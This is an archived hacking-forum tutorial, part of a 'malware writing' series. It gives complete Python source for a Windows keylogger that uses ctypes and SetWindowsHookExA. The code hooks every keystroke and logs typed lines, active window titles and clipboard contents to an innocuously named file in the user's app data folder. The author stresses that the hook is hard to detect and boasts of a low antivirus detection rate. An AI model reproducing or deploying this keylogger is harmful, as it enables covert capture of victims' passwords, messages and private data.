<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Malware writing series - Python Malware, part 2
Following @dtm‚Äôs comment regarding  GetAsyncKeyState being responsible for the crazy CPU usage in part 1, I decided to follow his recommendation and use SetWindowHookExA. I&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="11858.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="ORrASAIwUdacreMJ5pfXntoYt"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="ORrASAIwUdacreMJ5pfXntoYt"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA&#39;" href="11858.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/ba1c9a660ab3661d767a4519f2377d58dcc79499.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/ba1c9a660ab3661d767a4519f2377d58dcc79499.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858" />
<meta property="og:title" content="Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA" />
<meta name="twitter:title" content="Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA" />
<meta property="og:description" content="Malware writing series - Python Malware, part 2 Following @dtm‚Äôs comment regarding  GetAsyncKeyState being responsible for the crazy CPU usage in part 1, I decided to follow his recommendation and use SetWindowHookExA. Initially, this was supposed to be a simple introduction to ctypes. I wasn‚Äôt planning to write a second version of the keylogger with ctypes, but I changed my mind. Using SetWindowHookExA is much better and brought the CPU usage down two zero. But also, after searching for a keylo..." />
<meta name="twitter:description" content="Malware writing series - Python Malware, part 2 Following @dtm‚Äôs comment regarding  GetAsyncKeyState being responsible for the crazy CPU usage in part 1, I decided to follow his recommendation and use SetWindowHookExA. Initially, this was supposed to be a simple introduction to ctypes. I wasn‚Äôt planning to write a second version of the keylogger with ctypes, but I changed my mind. Using SetWindowHookExA is much better and brought the CPU usage down two zero. But also, after searching for a keylo..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="programming" />
<meta property="og:article:tag" content="python" />
<meta property="og:article:tag" content="winapi" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="6 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="21 ‚ù§" />
<meta property="article:published_time" content="2019-02-25T03:02:19+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="11858.html">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/malware.html' class='discourse-tag' rel="tag">malware</a>, 
            <a href='../../tag/programming.html' class='discourse-tag' rel="tag">programming</a>, 
            <a href='../../tag/python.html' class='discourse-tag' rel="tag">python</a>, 
            <a href='../../tag/winapi.html' class='discourse-tag' rel="tag">winapi</a>, 
            <a href='../../tag/hacking.html' class='discourse-tag' rel="tag">hacking</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA'>
      <link itemprop='url' href='11858.html'>
      <meta itemprop='datePublished' content='2019-02-25T03:02:19Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='malware, programming, python, winapi, hacking'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="11858.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/b/ba1c9a660ab3661d767a4519f2377d58dcc79499.png">

              <span class="crawler-post-infos">
                  <time  datetime='2019-02-25T03:02:19Z' class='post-time'>
                    February 25, 2019,  3:02am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-12T15:32:39Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h1>Malware writing series - Python Malware, part 2</h1>
<p>Following <a class="mention" href="../../u/dtm.html">@dtm</a>‚Äôs comment regarding  <code>GetAsyncKeyState</code> being responsible for the crazy CPU usage in part 1, I decided to follow his recommendation and use <code>SetWindowHookExA</code>. Initially, this was supposed to be a simple introduction to ctypes. I wasn‚Äôt planning to write a second version of the keylogger with ctypes, but I changed my mind. Using <code>SetWindowHookExA</code> is much better and brought the CPU usage down two zero. But also, after searching for a keylogger fully written with ctypes, I couldn‚Äôt find anything decent. Might as well make one.</p>
<p>Unfortunately it is much more complicated too. I tried multiple packages such as <code>keyboard</code> and <code>pynput</code> but both were very buggy and unreliable. Pynput couldn‚Äôt print special characters such as +, -, %, ^, etc. Keyboard has a bug were, then typing too fast, letters are missing. The package also have over 100 unresolved issues. The only maintainer appears to have abandoned the project. PyHook is just not an option. There are unofficial packages but Python 3 but they don‚Äôt contain bug fixes. The package is simply not reliable enough to use and will make the keylogger crash.</p>
<p>Therefore, I had no choice but to write everything from scratch.</p>
<p>So in this part, we‚Äôll rewrite the keylogger to use <code>SetWindowsHookEx</code>. It‚Äôs going to be a lot more complicated but will give us a deeper understanding on how to use ctypes to interact with the WinAPI.</p>
<p>Let‚Äôs start.</p>
<h2>Writing a keylogger in Python from scratch with ctypes</h2>
<p>What is a hook? From MSDN: <em>‚ÄúA hook is a point in the system message-handling mechanism where an application can install a subroutine to monitor the message traffic in the system and process certain types of messages before they reach the target window procedure.‚Äù</em></p>
<p>In simple terms, you hit a key, the hook intercepts the keyboard event.</p>
<p>We start by importing the required packages, load <code>user32.dll</code> and <code>kernel32.dll</code>, set up logging and create the variables to hold the text, the windows titles and keys pressed.</p>
<pre><code class="lang-auto">from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed
</code></pre>
<p>The hooking function we‚Äôre going to use are <code>SetWindowsHookExA</code>, <code>UnhookWindowsHookEx</code> and <code>CallNextHookEx</code>. We also need a class to use as data structure to hold the data from keyboard input events received from the <code>KBDLLHOOKSTRUCT</code> struct.</p>
<p>First, we must declare some constants that will be required later when calling WinAPI functions.</p>
<pre><code class="lang-auto">WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function
</code></pre>
<p><code>SetWindowsHookExA</code> needs to know what type of hook it has to set. We need to pass the hook ID as first argument. In this case, we use <code>WH_KEYBOARD_LL</code> because, unlike <code>WH_KEYBOARD</code>, it does not require to inject a DLL in the processes and therefore is hard to catch.</p>
<p><code>WM_KEYDOWN</code> tells us when a non-system key is pressed.</p>
<p><code>HC_ACTION</code> is an argument to pass to the <code>KeyboardProc</code> callback functions.</p>
<p>After, we have to map the virtual keys to their respective hex values and create the <code>HOOKPROC</code> callback function. Then we create a pointer that points to the callback function. This pointer is later passed as argument to <code>SetWindowsHookExA</code>.</p>
<pre><code class="lang-auto"># VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function
</code></pre>
<p>The virtual keys are needed to detect special keys pressed such as ENTER, SHIFT, etc. I did not include all of them, because the list is extensive but you can add more if you wish to log more. Just visit the reference in the code, above the variable name, to get all the hex values.</p>
<p>We use the <code>WINFUNCTYPE</code> factory ctypes function to create the <code>HOOKPROC</code> callback function.</p>
<p>Then, we need a data structure to hold information about the keyboard input events. We just need to replicate the structure provided by MSDN here: <a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct" rel="noopener nofollow ugc">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct</a></p>
<pre><code class="lang-auto">class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]
</code></pre>
<p>Now we have everything we need to start! This time, we will make a class named <code>hook</code> that will monitor the keyboard events by installing a hook.</p>
<pre><code class="lang-auto">class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None

</code></pre>
<p>We need to start with the constructor that will allow methods to call <code>user32.dll</code> and <code>kernel32.dll</code> functions. We also need to declare the variable <code>is_hooked</code> that will hold the handle to the hook procedure returned by <code>SetWindowsHookExA</code>.</p>
<p>We then proceed with creating the method <code>install_hook</code> that, as the name says, will install the hook calling <code>SetWindowsHookExA</code>, passing the hook ID (type of hook) and the pointer to the callback function as argument. The returned value is the handle to the hook procedure that we store in <code>is_hooked</code>.</p>
<p>Finally, we create the function <code>uninstall_hook</code> (optional) to uninstall the hook. Useful when testing the keylogger.</p>
<p>Then, we take our previously written <code>get_current_window()</code> and <code>get_clipboard()</code> functions from Part 1.</p>
<pre><code class="lang-auto">def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('latin1') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard
</code></pre>
<p>Now it‚Äôs time to write the hook procedure that this called every time a keyboard event occurs.</p>
<pre><code class="lang-auto">def hook_procedure(nCode, wParam, lParam):

    # Need to be global so they're not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window
</code></pre>
<p>We have to specify to the function that the variables we previously created are global and that they can be accessed by this function. The reason why we can‚Äôt use local variables is that, whenever a key is pressed, the <code>hook_procedure</code> function is executed and therefore, the local variables will be cleared at every key pressed. That‚Äôs not very useful if we want to use them to compared the last key, last window or last clipboard data.</p>
<p>Then, like in Part 1, we need to know what is the current window opened when the user is typing so we have some context and know how to use the data we retrieve.</p>
<pre><code class="lang-auto">    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info('[WINDOW] ' + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    """
    if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) &amp; 0x8000:
        hook.uninstall_hook()
        return 0
    """
</code></pre>
<p>Optionally, we can use a function to uninstall the hook whenever a specific key is pressed (CONTROL here). Now we can start writing the keylogging routine triggered at every key pressed.</p>
<pre><code class="lang-auto">    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
</code></pre>
<p>The logic here is that, when a key is pressed, we use <code>from_address</code> to take the information about the keyboard event and store it in the <code>kb</code> variable as a data structure, using the previously created <code>KBDLLHOOKSTRUCT</code> class. The we create a <code>state</code> variable of size 256 to hold the state of all 256 virtual keys. This is done by calling the <code>GetKeyboardState()</code> function.</p>
<p>Then, we declare a <code>buff</code> variable to create a unicode character buffer (an array of values with the <code>wchar</code> datatype). We then use <code>ToUnicode</code> function from <code>user32.dll</code> to translate the virtual key code or keyboard state to a unicode character, and the <code>wstring_at()</code> function to store the characters as 1-character unicode string.</p>
<p>ToUnicode can return one of four values: 1, a dead key, 0, for which there is no translation, - 1, a character and - 2 ‚â§ value, two or more characters.</p>
<p>The returned value is being stored in <code>n</code>. So every time a key is pressed, the hook procedure stores the return value and we can use this to determine whether or not we want to log the character or not. As long as <code>n</code> is larger than 0, we want to log the key pressed.</p>
<pre><code class="lang-auto">        if n &gt; 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                logging.info(line)
                line = ""

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))
</code></pre>
<p>The rest is pretty simple. We start by logging any key. The key is appended to the <code>line</code> variable to create a full, easily readable line.</p>
<p>Then, if <code>RETURN</code> is pressed, we log the line and clear the <code>line</code> variable.</p>
<p>Finally, we check the current status of the clipboard. If there is new data in the clipboard, we log that data. Then we pass the hook information to the next hook procedure with <code>CallNextHookEx</code>. And it continues again and again.</p>
<p>That‚Äôs about it! All we have to do is:<br>
- Create an instance of the <code>hook()</code> class<br>
- Create the pointer with <code>ptr</code><br>
- Install the hook with <code>install_hook(ptr)</code><br>
- Wait for system messages to be intercepted by the hook</p>
<pre><code class="lang-auto">hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()
user32.GetMessageA(byref(msg), 0, 0, 0)
</code></pre>
<p>Look at that CPU usage!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/ba1c9a660ab3661d767a4519f2377d58dcc79499.png" alt="image" data-base62-sha1="qyq5FmfyFH3ui7bvhLxdFojtSIh" width="690" height="36"></p>
<p>Look at that detection rate!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/4d840c45f70353185f8cfce6ff5daa689b68f742.png" alt="image" data-base62-sha1="b3JFWZupPjyRSbyldLzEaX6MJ2i" width="690" height="241"><br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="../../../0x00sec.s3.amazonaws.com/original/3X/d/9/d94764657d0d75c8dc3b4c65d15a3a10d3418817.png" class="site-icon" width="100" height="89">
      <a href="../../../external.html?link=https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">virustotal.com</a>
  </header>
  <article class="onebox-body">
    <img src="#" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">VirusTotal</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>I don‚Äôt know who the fuck uses Jiangmin anyway.</p>
<p>There‚Äôs one issue I am working on at the moment and I‚Äôll update the code and the post when I find a solution. PyInstaller seems to have poor support for either ctypes or the logging library. Therefore, it creates the file on disk at execution but isn‚Äôt writing in it. I‚Äôm currently looking and testing alternatives and will update accordingly.</p>
